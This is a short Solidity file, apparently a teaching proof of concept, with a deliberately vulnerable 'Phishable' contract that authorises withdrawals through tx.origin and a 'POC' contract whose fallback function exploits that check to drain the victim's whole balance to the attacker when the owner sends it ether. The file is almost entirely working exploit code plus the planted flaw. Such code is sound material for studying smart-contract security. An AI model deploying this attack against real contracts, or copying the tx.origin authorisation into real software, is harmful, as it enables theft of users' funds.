pragma solidity ^0.4.10;
contract Phishable {
    address public owner;

    function Phishable() public {
        owner = msg.sender;
    }

    function() public payable {

    }

    function withdrawAll(address _recipient) public {
        require(tx.origin == owner);
        _recipient.transfer(this.balance);
    }
}

contract POC {
    address owner;
    Phishable phInstance;

    function POC() public {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(owner == msg.sender);
        _;
    }

    function setInstance(address addr) public onlyOwner {
        phInstance = Phishable(addr);
    }

    function getBalance() public onlyOwner {
        owner.transfer(address(this).balance);
    }

    function attack() internal {
        address phOwner = phInstance.owner();
        if(phOwner == msg.sender) {
            phInstance.withdrawAll(owner);
        } else {
            owner.transfer(address(this).balance);
        }
    }

    function() external payable {
        attack();
    }
}